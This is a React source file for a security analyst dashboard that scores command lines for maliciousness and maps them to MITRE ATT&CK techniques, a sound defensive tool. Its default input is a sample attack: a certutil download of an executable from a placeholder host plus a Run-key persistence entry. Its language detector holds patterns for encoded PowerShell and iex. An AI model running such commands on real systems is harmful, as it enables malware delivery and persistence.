/**
 * RC5 · Analyst UI (P1) — deterministic-first analyst dashboard.
 *
 * Consumes `/api/rc5/parse` + shadow + golden endpoints and renders:
 *   - Verdict card + 7-dim scores
 *   - 5-stage confidence breakdown
 *   - Evidence Tree drill-down
 *   - MITRE mappings table + Navigator JSON download + Open-in-Navigator
 *   - LOLBIN 3-state table
 *   - "Why NOT Malicious?" panel
 *   - Behaviors table
 *   - Golden Corpus health card
 *   - Shadow gate readiness card
 *   - Explainability export (JSON / HTML / PDF)
 *   - X-Decode-Ms surfaced on each response
 */
import React, { useState, useEffect, useCallback } from "react";
import api, { API_BASE } from "@/lib/api";
import { Button } from "@/components/ui/button";
import { Card, CardContent, CardHeader, CardTitle } from "@/components/ui/card";
import { Textarea } from "@/components/ui/textarea";
import { Badge } from "@/components/ui/badge";
import { toast } from "sonner";

const TIER_STYLE = {
  Benign:     "bg-emerald-950 text-emerald-300 border-emerald-800",
  Suspicious: "bg-amber-950  text-amber-300  border-amber-800",
  Malicious:  "bg-rose-950   text-rose-300   border-rose-800",
  Critical:   "bg-red-950    text-red-200    border-red-500",
};

function downloadBlob(blob, filename) {
  const url = URL.createObjectURL(blob);
  const a = document.createElement("a");
  a.href = url;
  a.download = filename;
  document.body.appendChild(a);
  a.click();
  a.remove();
  setTimeout(() => URL.revokeObjectURL(url), 500);
}

function openInNavigator(layer) {
  // Post layer JSON to attack-navigator via the "upload=json&url=" mechanism:
  // The simplest deterministic UX: copy layer to clipboard + open Navigator.
  navigator.clipboard.writeText(JSON.stringify(layer, null, 2));
  toast.success("Navigator layer copied — paste into ATT&CK Navigator", {
    description: "https://mitre-attack.github.io/attack-navigator/",
  });
  window.open("https://mitre-attack.github.io/attack-navigator/", "_blank",
              "noopener,noreferrer");
}

const AnalystRC5Page = () => {
  const [input, setInput] = useState(
    "certutil -urlcache -f http://x.tld/a.exe C:\\a.exe && " +
    "reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v x /d C:\\a.exe /f");
  // Auto-detected language — analyst never needs to pick manually.
  // Detection is deterministic; see detectLanguage() below.
  const [loading, setLoading] = useState(false);
  const [rc5, setRc5] = useState(null);
  const [xDecodeMs, setXDecodeMs] = useState(null);
  const [detected, setDetected] = useState("cmd");
  const [gate, setGate] = useState(null);
  const [golden, setGolden] = useState(null);

  // ── Deterministic language auto-detection (no manual selector) ──
  // Uses ordered marker scoring — no regex on secrets, no AI. Ties
  // break toward `cmd` (safer default). Exposed via `detected` state
  // so the badge next to AUTO-INVESTIGATE reflects the pick.
  const detectLanguage = useCallback((src) => {
    const s = (src || "").trim();
    if (!s) return "cmd";
    const lower = s.toLowerCase();
    let ps = 0, cmd = 0;
    // Strong PS markers
    if (/\$\w+\s*=/.test(s)) ps += 3;             // $var = …
    if (/-enc(?:odedcommand)?\b/i.test(s)) ps += 4; // powershell -enc
    if (/-executionpolicy\b/i.test(s)) ps += 3;
    if (/(^|\s)iex\b/i.test(s)) ps += 3;
    if (/(invoke-expression|invoke-webrequest|invoke-restmethod)/i.test(s)) ps += 3;
    if (/new-object\b/i.test(s)) ps += 3;
    if (/\bwrite-host\b|\bget-\w+|\bset-\w+|\bstart-\w+|\bstop-\w+/i.test(s)) ps += 2;
    if (/\[system\.|\[convert\]|\[text\.encoding\]|\[net\.webclient\]|\[char\]/i.test(s)) ps += 3;
    if (/\|\s*iex\b/i.test(s)) ps += 4;
    if (/-\w+\s+@\{/.test(s)) ps += 2;             // splatting
    if (/\bpowershell(\.exe)?\b/i.test(lower)) ps += 2;
    // Strong CMD markers
    if (/\b(certutil|reg\s+(add|delete|query)|wmic|schtasks|sc\s|vssadmin|net\s+(user|group|localgroup)|netsh|bcdedit|robocopy|xcopy)\b/i.test(s)) cmd += 3;
    if (/%\w+%/.test(s)) cmd += 2;                 // %ENV% variables
    if (/\^&|\^\||\^</.test(s)) cmd += 2;           // cmd escape ^
    if (/\bcmd(\.exe)?\s+\/[a-z]/i.test(s)) cmd += 3;
    if (/\/[a-zA-Z]\b(?![:\/])/.test(s)) cmd += 1; // /S /Q /F …
    if (/&&/.test(s)) cmd += 1;
    return ps > cmd ? "powershell" : "cmd";
  }, []);

  // Re-detect on every input change so the badge stays fresh.
  useEffect(() => { setDetected(detectLanguage(input)); }, [input, detectLanguage]);

  const load = useCallback(async () => {
    try {
      const [g, s] = await Promise.all([
        api.get("/rc5/golden/summary").catch(() => ({ data: null })),
        api.get("/rc5/shadow/gate").catch(() => ({ data: null })),
      ]);
      setGolden(g.data);
      setGate(s.data);
    } catch (_e) {}
  }, []);
  useEffect(() => { load(); }, [load]);

  const analyze = useCallback(async () => {
    if (!input.trim()) return;
    setLoading(true);
    // Compute once at click-time so the API + badge stay in sync.
    const lang = detectLanguage(input);
    setDetected(lang);
    try {
      const r = await api.post("/rc5/parse", { input, language: lang });
      setRc5(r.data);
      const ms = r.headers?.["x-decode-ms"] || r.headers?.["X-Decode-Ms"];
      setXDecodeMs(ms || null);
      toast.success(`Auto-investigate complete · detected ${lang.toUpperCase()}`);
    } catch (e) {
      toast.error(e?.response?.data?.detail || "RC5 parse failed");
    } finally {
      setLoading(false);
    }
  }, [input, detectLanguage]);

  const runGolden = useCallback(async () => {
    setLoading(true);
    try {
      const r = await api.post("/rc5/golden/run");
      setGolden({
        run_id: r.data.run_id, ts: r.data.ts, total: r.data.total,
        passed: r.data.passed, failed: r.data.failed,
        pass_rate: r.data.pass_rate, coverage: r.data.coverage,
        accuracy: r.data.accuracy,
        regression_count: r.data.regression_count,
        newly_failing: r.data.newly_failing,
        newly_supported: r.data.newly_supported,
      });
      toast.success(`Golden Corpus: ${r.data.passed}/${r.data.total} passed (${r.data.pass_rate}%)`);
    } catch (e) {
      toast.error("Golden Corpus run failed");
    } finally {
      setLoading(false);
    }
  }, []);

  const exportBundle = useCallback(async (fmt) => {
    try {
      const lang = detectLanguage(input);
      const r = await api.post("/rc5/explain/export",
        { input, language: lang, format: fmt }, { responseType: "blob" });
      downloadBlob(r.data, `nivxray-explain.${fmt}`);
    } catch (_e) {
      toast.error(`Export ${fmt} failed`);
    }
  }, [input, detectLanguage]);

  const downloadNavigatorJson = useCallback(() => {
    if (!rc5?.mitre_navigator) return;
    downloadBlob(
      new Blob([JSON.stringify(rc5.mitre_navigator, null, 2)],
               { type: "application/json" }),
      "nivxray-attack-navigator.json"
    );
  }, [rc5]);

  return (
    <div className="min-h-screen bg-[#0e1116] text-slate-100 p-6" data-testid="analyst-rc5-page">
      <div className="max-w-7xl mx-auto space-y-6">
        <header className="flex items-baseline justify-between">
          <div>
            <h1 className="text-2xl font-bold text-sky-300">NivXRay · RC5 Analyst</h1>
            <p className="text-xs text-slate-500">
              Deterministic-first · Evidence-linked · No AI in decoded fields
            </p>
          </div>
          <div className="flex gap-2 text-xs">
            {xDecodeMs && (
              <Badge data-testid="x-decode-ms-badge"
                     className="bg-slate-800 text-sky-300 border border-slate-700">
                X-Decode-Ms {xDecodeMs}
              </Badge>
            )}
          </div>
        </header>

        {/* health cards row */}
        <div className="grid grid-cols-1 md:grid-cols-3 gap-4">
          <GoldenCard golden={golden} onRun={runGolden} loading={loading}/>
          <GateCard gate={gate} onRefresh={load}/>
          <ShadowRunCard/>
        </div>

        {/* input */}
        <Card className="bg-slate-900 border-slate-800">
          <CardHeader>
            <CardTitle className="text-slate-200 text-base">Input</CardTitle>
          </CardHeader>
          <CardContent className="space-y-3">
            <Textarea
              data-testid="rc5-input"
              value={input}
              onChange={(e) => setInput(e.target.value)}
              rows={4}
              className="bg-slate-950 border-slate-800 text-slate-100 font-mono text-xs"
            />
            <div className="flex items-center gap-3 flex-wrap">
              {/* Deterministic auto-detected language — read-only badge.
                  Analyst never needs to pick manually. */}
              <div className="flex items-center gap-2 px-3 py-1.5 rounded
                              bg-slate-950 border border-slate-800"
                   title="Language auto-detected from input markers"
                   data-testid="rc5-detected-language">
                <span className="text-[10px] font-mono uppercase tracking-wider text-slate-500">
                  auto-detected
                </span>
                <span className="text-xs font-mono font-semibold text-emerald-300 uppercase"
                      data-testid="rc5-detected-language-value">
                  {detected}
                </span>
              </div>
              <Button data-testid="rc5-analyze"
                      onClick={analyze} disabled={loading || !input.trim()}
                      className="bg-emerald-600 hover:bg-emerald-500 text-white
                                 uppercase tracking-wider font-semibold">
                {loading ? "Investigating…" : "◈ Auto-Investigate"}
              </Button>
              <div className="ml-auto flex gap-2">
                <Button data-testid="export-json" variant="outline"
                        onClick={() => exportBundle("json")}
                        className="border-slate-700 text-slate-300 hover:bg-slate-800">
                  Export JSON
                </Button>
                <Button data-testid="export-html" variant="outline"
                        onClick={() => exportBundle("html")}
                        className="border-slate-700 text-slate-300 hover:bg-slate-800">
                  Export HTML
                </Button>
                <Button data-testid="export-pdf" variant="outline"
                        onClick={() => exportBundle("pdf")}
                        className="border-slate-700 text-slate-300 hover:bg-slate-800">
                  Export PDF
                </Button>
              </div>
            </div>
          </CardContent>
        </Card>

        {rc5 && <ResultsPanel rc5={rc5}
                              onNavJson={downloadNavigatorJson}
                              onOpenNav={() => openInNavigator(rc5.mitre_navigator)} />}
      </div>
    </div>
  );
};

/* -------------------- Health cards ------------------------------- */
const GoldenCard = ({ golden, onRun, loading }) => (
  <Card className="bg-slate-900 border-slate-800" data-testid="golden-card">
    <CardHeader className="pb-2">
      <div className="flex items-center justify-between">
        <CardTitle className="text-slate-200 text-base">Golden Corpus</CardTitle>
        <Button data-testid="run-golden" size="sm" variant="outline"
                onClick={onRun} disabled={loading}
                className="border-slate-700 text-slate-300 hover:bg-slate-800 text-xs">
          Run now
        </Button>
      </div>
    </CardHeader>
    <CardContent>
      {golden && golden.total > 0 ? (
        <>
          <div className="flex items-baseline gap-3">
            <span data-testid="golden-pass-rate" className="text-2xl font-bold text-emerald-400">
              {golden.pass_rate}%
            </span>
            <span className="text-xs text-slate-400">
              {golden.passed}/{golden.total} pass · {golden.regression_count} regr
            </span>
          </div>
          <dl className="mt-2 grid grid-cols-2 text-[11px] gap-y-0.5 text-slate-400">
            <dt>verdict acc</dt><dd className="text-slate-200 text-right">{golden.accuracy?.verdict}%</dd>
            <dt>mitre acc</dt><dd className="text-slate-200 text-right">{golden.accuracy?.mitre}%</dd>
            <dt>lolbin acc</dt><dd className="text-slate-200 text-right">{golden.accuracy?.lolbin}%</dd>
            <dt>coverage-sem</dt><dd className="text-slate-200 text-right">{golden.coverage?.semantic}%</dd>
          </dl>
        </>
      ) : (
        <p className="text-xs text-slate-500">No runs yet. Click "Run now".</p>
      )}
    </CardContent>
  </Card>
);

const GateCard = ({ gate, onRefresh }) => (
  <Card className="bg-slate-900 border-slate-800" data-testid="gate-card">
    <CardHeader className="pb-2">
      <div className="flex items-center justify-between">
        <CardTitle className="text-slate-200 text-base">Cutover Gate</CardTitle>
        <Button data-testid="refresh-gate" size="sm" variant="outline"
                onClick={onRefresh}
                className="border-slate-700 text-slate-300 hover:bg-slate-800 text-xs">
          Refresh
        </Button>
      </div>
    </CardHeader>
    <CardContent>
      {gate ? (
        <>
          <div className={`text-lg font-bold ${gate.ready_for_cutover
            ? "text-emerald-400" : "text-amber-400"}`}
               data-testid="gate-status">
            {gate.ready_for_cutover ? "READY" : "BLOCKED"}
          </div>
          <div className="text-[11px] text-slate-500 mb-2">
            {gate.total_snapshots} snapshots
          </div>
          <ul className="text-[11px] space-y-0.5">
            {Object.entries(gate.checks || {}).map(([k, ok]) => (
              <li key={k}>
                <span className={ok ? "text-emerald-400" : "text-rose-400"}>
                  {ok ? "✓" : "✗"}
                </span>{" "}
                <span className="text-slate-300">{k}</span>
              </li>
            ))}
          </ul>
        </>
      ) : <p className="text-xs text-slate-500">Loading…</p>}
    </CardContent>
  </Card>
);

const ShadowRunCard = () => (
  <Card className="bg-slate-900 border-slate-800" data-testid="shadow-card">
    <CardHeader className="pb-2">
      <CardTitle className="text-slate-200 text-base">Shadow Run</CardTitle>
    </CardHeader>
    <CardContent>
      <p className="text-xs text-slate-400 leading-5">
        30-day RC4 vs RC5 comparison armed. Every sample analysed produces a delta
        snapshot on <code className="text-sky-400">/api/rc5/shadow/*</code>. Daily +
        cumulative reports available via the delta-report CLI.
      </p>
    </CardContent>
  </Card>
);

/* -------------------- Results panel ------------------------------ */
const ResultsPanel = ({ rc5, onNavJson, onOpenNav }) => {
  const v = rc5.verdict_v2 || {};
  const ex = rc5.explain || {};
  const conf = ex.confidence_breakdown || {};
  const wnm = ex.why_not_malicious || {};
  const tree = ex.evidence_tree || [];
  const mitre = rc5.mitre || [];
  const lolbins = rc5.lolbins_v2 || [];
  const behaviors = rc5.behaviors || [];
  const tierClass = TIER_STYLE[v.verdict] || TIER_STYLE.Benign;

  return (
    <div className="space-y-4">
      <Card className={`border ${tierClass}`} data-testid="verdict-card">
        <CardContent className="pt-6 flex flex-wrap items-baseline gap-6">
          <div>
            <div className="text-[11px] uppercase tracking-widest opacity-70">Verdict</div>
            <div data-testid="verdict-tier" className="text-3xl font-black">{v.verdict}</div>
          </div>
          <div>
            <div className="text-[11px] uppercase tracking-widest opacity-70">Risk</div>
            <div data-testid="verdict-risk" className="text-3xl font-black">{v.risk}</div>
          </div>
          <div>
            <div className="text-[11px] uppercase tracking-widest opacity-70">Raw</div>
            <div className="text-2xl">{v.raw_risk}</div>
          </div>
          {v.cap_applied && (<div><div className="text-[11px] uppercase opacity-70">Cap</div>
            <div className="text-sm">{v.cap_applied}</div></div>)}
          {v.floor_applied && (<div><div className="text-[11px] uppercase opacity-70">Floor</div>
            <div className="text-sm">{v.floor_applied}</div></div>)}
        </CardContent>
      </Card>

      {/* 7-dim scores + confidence */}
      <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
        <Card className="bg-slate-900 border-slate-800">
          <CardHeader><CardTitle className="text-sm text-slate-300">7-Dimension Scores</CardTitle></CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 gap-2" data-testid="dim-scores">
              {Object.entries(v.scores || {}).map(([k, val]) => (
                <div key={k} className="text-xs">
                  <div className="flex justify-between text-slate-400">
                    <span>{k}</span><span className="text-slate-200 font-mono">{val}</span>
                  </div>
                  <div className="h-1.5 bg-slate-800 rounded overflow-hidden">
                    <div className="h-full bg-sky-500"
                         style={{ width: `${val}%` }}/>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
        <Card className="bg-slate-900 border-slate-800">
          <CardHeader><CardTitle className="text-sm text-slate-300">Confidence Breakdown (5 stages)</CardTitle></CardHeader>
          <CardContent>
            <div className="grid grid-cols-2 gap-2" data-testid="confidence-breakdown">
              {["decode", "semantic_reconstruction", "behavior", "mitre",
                "verdict", "weighted_overall"].map((k) => (
                <div key={k} className="text-xs">
                  <div className="flex justify-between text-slate-400">
                    <span>{k}</span><span className="text-slate-200 font-mono">{conf[k]}</span>
                  </div>
                  <div className="h-1.5 bg-slate-800 rounded overflow-hidden">
                    <div className="h-full bg-emerald-500"
                         style={{ width: `${conf[k] || 0}%` }}/>
                  </div>
                </div>
              ))}
            </div>
          </CardContent>
        </Card>
      </div>

      {/* Why NOT Malicious */}
      <Card className="bg-slate-900 border-slate-800" data-testid="wnm-card">
        <CardHeader><CardTitle className="text-sm text-amber-300">Why NOT Malicious?</CardTitle></CardHeader>
        <CardContent>
          {wnm.applicable ? (
            <>
              <p className="text-slate-200 text-sm mb-3">{wnm.summary}</p>
              <ul className="text-xs text-slate-400 space-y-1 list-disc list-inside">
                {(wnm.missing_signals || []).map((s, i) => (
                  <li key={i} data-testid={`wnm-signal-${i}`}>{s}</li>
                ))}
              </ul>
              {wnm.guardrails_applied?.length > 0 && (
                <div className="mt-3">
                  <div className="text-[11px] uppercase text-slate-500 mb-1">Guardrails applied</div>
                  <ul className="text-xs text-slate-400 space-y-1 list-disc list-inside">
                    {wnm.guardrails_applied.map((g, i) => <li key={i}>{g}</li>)}
                  </ul>
                </div>
              )}
            </>
          ) : (
            <p className="text-slate-500 text-xs">Not applicable — verdict is {v.verdict}.</p>
          )}
        </CardContent>
      </Card>

      {/* Evidence Tree */}
      <Card className="bg-slate-900 border-slate-800" data-testid="evidence-tree">
        <CardHeader><CardTitle className="text-sm text-slate-300">Evidence Tree</CardTitle></CardHeader>
        <CardContent className="space-y-2">
          {tree.length ? tree.map((l, i) => (
            <div key={i} className="border-l-2 border-sky-500 bg-slate-950/60 px-3 py-2 text-xs"
                 data-testid={`evidence-link-${i}`}>
              <div className="text-slate-100 font-semibold">{l.reason}</div>
              <div className="text-slate-500 text-[11px] mt-0.5">
                dim=<b>{l.dimension}</b> · contribution={l.contribution} ·
                {" "}tactic={l.behavior_tactic}
              </div>
              <div className="text-slate-500 text-[11px] mt-0.5">
                behavior={l.behavior_id} · nodes={(l.exec_node_ids || []).join(", ")}
              </div>
              {l.behavior_reconstructed && (
                <pre className="mt-1 text-slate-300 text-[11px] whitespace-pre-wrap break-all">
                  {l.behavior_reconstructed}
                </pre>
              )}
            </div>
          )) : <p className="text-slate-500 text-xs">No evidence links.</p>}
        </CardContent>
      </Card>

      {/* MITRE */}
      <Card className="bg-slate-900 border-slate-800" data-testid="mitre-card">
        <CardHeader>
          <div className="flex justify-between items-center">
            <CardTitle className="text-sm text-slate-300">
              MITRE ATT&amp;CK Mappings ({mitre.length})
            </CardTitle>
            <div className="flex gap-2">
              <Button data-testid="download-navigator" size="sm" variant="outline"
                      onClick={onNavJson}
                      className="border-slate-700 text-slate-300 hover:bg-slate-800 text-xs">
                Download Navigator JSON
              </Button>
              <Button data-testid="open-navigator" size="sm"
                      onClick={onOpenNav}
                      className="bg-amber-600 hover:bg-amber-500 text-xs">
                Open in ATT&amp;CK Navigator
              </Button>
            </div>
          </div>
        </CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead className="text-slate-400 border-b border-slate-800">
                <tr>
                  <th className="text-left p-2">Tid</th>
                  <th className="text-left p-2">Sub</th>
                  <th className="text-left p-2">Name</th>
                  <th className="text-left p-2">Tactic</th>
                  <th className="text-left p-2">Conf</th>
                  <th className="text-left p-2">Rule</th>
                </tr>
              </thead>
              <tbody>
                {mitre.map((m, i) => (
                  <tr key={i} className="border-b border-slate-800/50">
                    <td className="p-2 font-mono text-sky-300">{m.technique_id}</td>
                    <td className="p-2 font-mono text-slate-400">{m.sub_technique_id || "—"}</td>
                    <td className="p-2 text-slate-200">{m.technique_name}</td>
                    <td className="p-2 text-slate-400">{m.tactic_name}</td>
                    <td className="p-2 text-emerald-400 font-mono">{m.confidence}</td>
                    <td className="p-2 text-slate-500 font-mono">{m.rule_id}</td>
                  </tr>
                ))}
                {!mitre.length && (
                  <tr><td colSpan="6" className="p-3 text-center text-slate-500">
                    No mappings emitted.
                  </td></tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>

      {/* LOLBIN */}
      <Card className="bg-slate-900 border-slate-800" data-testid="lolbin-card">
        <CardHeader><CardTitle className="text-sm text-slate-300">
          LOLBIN 3-State Attribution ({lolbins.length})
        </CardTitle></CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead className="text-slate-400 border-b border-slate-800">
                <tr>
                  <th className="text-left p-2">Binary</th>
                  <th className="text-left p-2">State</th>
                  <th className="text-left p-2">→ Verdict</th>
                  <th className="text-left p-2">Purposes</th>
                  <th className="text-left p-2">MITRE</th>
                  <th className="text-left p-2">Ref</th>
                </tr>
              </thead>
              <tbody>
                {lolbins.map((l, i) => (
                  <tr key={i} className="border-b border-slate-800/50">
                    <td className="p-2 text-slate-100 font-mono">{l.display_name}</td>
                    <td className="p-2">
                      <span className={`text-[10px] px-2 py-0.5 rounded uppercase ${
                        l.state === "executed" ? "bg-rose-950 text-rose-300"
                        : l.state === "expanded" ? "bg-amber-950 text-amber-300"
                        : "bg-slate-800 text-slate-400"
                      }`}>{l.state}</span>
                    </td>
                    <td className="p-2">
                      {l.enters_verdict
                        ? <span className="text-emerald-400">yes</span>
                        : <span className="text-slate-500">no</span>}
                    </td>
                    <td className="p-2 text-slate-400">{(l.purposes || []).join(", ")}</td>
                    <td className="p-2 text-sky-400 font-mono text-[11px]">
                      {(l.mitre || []).join(", ")}
                    </td>
                    <td className="p-2">
                      {l.url && (
                        <a href={l.url} target="_blank" rel="noopener noreferrer"
                           className="text-sky-400 hover:underline text-[11px]">docs</a>
                      )}
                    </td>
                  </tr>
                ))}
                {!lolbins.length && (
                  <tr><td colSpan="6" className="p-3 text-center text-slate-500">
                    No LOLBIN observed.
                  </td></tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>

      {/* Behaviors */}
      <Card className="bg-slate-900 border-slate-800" data-testid="behaviors-card">
        <CardHeader><CardTitle className="text-sm text-slate-300">
          Behaviors ({behaviors.length})
        </CardTitle></CardHeader>
        <CardContent>
          <div className="overflow-x-auto">
            <table className="w-full text-xs">
              <thead className="text-slate-400 border-b border-slate-800">
                <tr>
                  <th className="text-left p-2">Tactic</th>
                  <th className="text-left p-2">Sub-kind</th>
                  <th className="text-left p-2">Conf</th>
                  <th className="text-left p-2">Reconstructed</th>
                </tr>
              </thead>
              <tbody>
                {behaviors.map((b, i) => (
                  <tr key={i} className="border-b border-slate-800/50">
                    <td className="p-2 text-sky-300">{b.tactic}</td>
                    <td className="p-2 text-slate-400">{b.sub_kind || "—"}</td>
                    <td className="p-2 text-emerald-400 font-mono">{b.confidence}</td>
                    <td className="p-2 text-slate-300 font-mono text-[11px] max-w-md truncate">
                      {b.reconstructed}
                    </td>
                  </tr>
                ))}
                {!behaviors.length && (
                  <tr><td colSpan="4" className="p-3 text-center text-slate-500">
                    No behaviors extracted.
                  </td></tr>
                )}
              </tbody>
            </table>
          </div>
        </CardContent>
      </Card>
    </div>
  );
};

export default AnalystRC5Page;
